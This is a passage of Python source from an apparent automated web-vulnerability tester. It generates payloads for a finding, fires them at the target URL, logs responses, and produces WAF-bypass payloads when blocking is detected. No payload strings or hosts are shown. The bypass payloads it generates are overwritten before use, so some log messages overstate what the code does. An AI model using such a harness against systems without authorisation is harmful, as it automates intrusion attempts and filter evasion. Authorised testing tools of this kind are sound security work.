            finding: The finding to test
            test_func: Async function that tests a payload
                       Returns (success: bool, response: str)
            max_attempts: Maximum refinement attempts
            max_payloads_per_attempt: Max payloads to try per attempt
            
        Returns:
            Dict with keys: success, payload, evidence, technique
        """
        context = self.generator._build_context(finding)
        best_result = {
            "success": False,
            "payload": None,
            "evidence": None,
            "technique": None,
            "attempts": 0
        }
        
        for attempt in range(max_attempts):
            logger.info(f"Payload test attempt {attempt + 1}/{max_attempts}")
            
            # Generate payloads
            payloads = await self.generator.generate_payloads(
                finding, context,
                num_payloads=max_payloads_per_attempt,
                use_cache=(attempt == 0)
            )
            
            if not payloads:
                logger.warning("No payloads generated")
                break
            
            # Test each payload
            for gp in sorted(payloads, key=lambda x: x.priority):
                try:
                    logger.debug(f"Testing payload: {gp.payload[:50]}... ({gp.technique})")
                    success, response = await test_func(finding.url, gp.payload)
                    
                    result = {
                        "payload": gp.payload,
                        "response": str(response)[:500],
                        "success": success,
                        "technique": gp.technique
                    }
                    self.results.append(result)
                    
                    if success:
                        logger.info(f"✅ Payload successful: {gp.technique}")
                        return {
                            "success": True,
                            "payload": gp.payload,
                            "evidence": response,
                            "technique": gp.technique,
                            "attempts": attempt + 1
                        }
                    
                    # Update context with result
                    context.add_test_result(gp.payload, success, str(response)[:500])
                    
                except Exception as e:
                    logger.error(f"Payload test error: {e}")
            
            # If we're here, all payloads failed
            if attempt < max_attempts - 1:
                if context.waf_detected:
                    logger.info("WAF detected, generating bypass payloads")
                    payloads = await self.generator.generate_bypass_payloads(
                        finding, context, context.blocked_patterns
                    )
                else:
                    logger.info("Generating refined payloads")
            
            best_result["attempts"] = attempt + 1
        
        return best_result
    
    def get_test_summary(self) -> dict:
        """Get summary of all tests performed."""
        total = len(self.results)
        successful = sum(1 for r in self.results if r.get("success"))
        blocked = sum(1 for r in self.results if "blocked" in r.get("response", "").lower())
        
        return {
            "total_tests": total,
            "successful": successful,
            "failed": total - successful,
            "blocked": blocked,
            "techniques_tried": list(set(r.get("technique") for r in self.results if r.get("technique")))
        }
